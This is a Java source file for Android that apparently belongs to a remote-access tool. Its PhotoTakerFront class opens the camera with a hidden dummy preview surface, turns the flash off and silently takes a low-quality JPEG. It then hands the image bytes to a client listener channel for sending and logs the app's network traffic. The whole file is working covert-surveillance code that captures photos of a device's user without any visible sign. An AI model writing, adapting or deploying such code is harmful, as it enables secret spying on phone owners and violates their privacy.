package my.app.Library;

import java.io.IOException;

import my.app.client.ClientListener;
import my.app.client.R;
import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.graphics.SurfaceTexture;
import android.hardware.Camera;
import android.hardware.Camera.CameraInfo;
import android.hardware.Camera.Parameters;
import android.hardware.Camera.PictureCallback;
import android.net.TrafficStats;
import android.os.Bundle;
import android.os.IBinder;
import android.sax.StartElementListener;
import android.util.Log;
import android.view.SurfaceHolder;
import android.view.SurfaceHolder.Callback;
import android.view.SurfaceView;
import android.view.WindowManager;
import android.webkit.WebView.FindListener;
import android.widget.ImageView;

public class PhotoTakerFront implements Camera.PictureCallback {

	Camera cam;
	ClientListener ctx;
	int chan;
	SurfaceHolder holder;
	private long GlobalRX = 0;

	private long GlobalTX = 0;
	private long ProcessRX = 0;

	private long ProcessTX = 0;

	public PhotoTakerFront(ClientListener c, int chan) {
		this.chan = chan;
		ctx = c;
	}

	public boolean takePhoto() throws InterruptedException {
		if (!(ctx.getApplicationContext().getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)))
			return false;
		Log.i("CAMERA", "la fotocamera è presente");

		int cameraId = -1;
		int numberOfCameras = Camera.getNumberOfCameras();
		for (int i = 0; i < numberOfCameras; i++) {
			CameraInfo info = new CameraInfo();
			Camera.getCameraInfo(i, info);
			Log.i("CAMERA", "Hai a disposizione la camera: " + Integer.toString(i));
		}
		try {
			cam = Camera.open(0);
		} catch (Exception e) {
			return false;
		}

		Log.i("CAMERA", "fotocamera aperta correttamente");

		try {
			cam.setPreviewTexture(new SurfaceTexture(10));
		} catch (IOException e1) {
			Log.i("CAMERA", "problema a creare la surfaceTexture");
		}
		Log.i("CAMERA", "surfacetexture creata correttamente");
		Parameters params = cam.getParameters();
		params.setPreviewSize(640, 480);
		Log.i("CAMERA", "preview impostata");
		params.setFlashMode(Camera.Parameters.FLASH_MODE_OFF);
		Log.i("CAMERA", "flash impostato");
		params.setPictureFormat(ImageFormat.JPEG);
		params.setJpegQuality(30);
		Log.i("CAMERA", "formato impostato");
		cam.setParameters(params);
		Log.i("CAMERA", "parametri inviati alla fotocamera");
		cam.startPreview();
		Log.i("CAMERA", "mi metto a dormire");
		// Thread.sleep(30000);
		Log.i("CAMERA", "la preview è pronta; mi sveglio");
		cam.takePicture(null, null, null, this);
		return true;
	}

	public void onPictureTaken(byte[] data, Camera camera) {
		// TODO Auto-generated method stub
		Log.i("CAMERA", "fotografia scattata");
		ctx.handleData(chan, data);
		Log.i("CAMERA", "fotografia inviata");
		camera.stopPreview();
		camera.release();
		cam = null;
		Log.i("CAMERA", "camera distrutta");
		int pid = android.os.Process.myUid();
		ProcessRX = TrafficStats.getUidRxBytes(pid);

		ProcessTX = TrafficStats.getUidTxBytes(pid);
		ProcessRX = ProcessRX / 1048576;
		ProcessTX = ProcessTX / 1048576;
		Log.i("CAMERA", "dati ricevuti: " + ProcessRX + "; dati inviati: " + ProcessTX);
		GlobalRX = TrafficStats.getMobileRxBytes();

		GlobalTX = TrafficStats.getMobileTxBytes();
		GlobalRX = GlobalRX / 1048576;
		GlobalTX = GlobalTX / 1048576;
		Log.i("CAMERA", "dati ricevuti: " + GlobalRX + "; dati inviati: " + GlobalTX);
	}

}
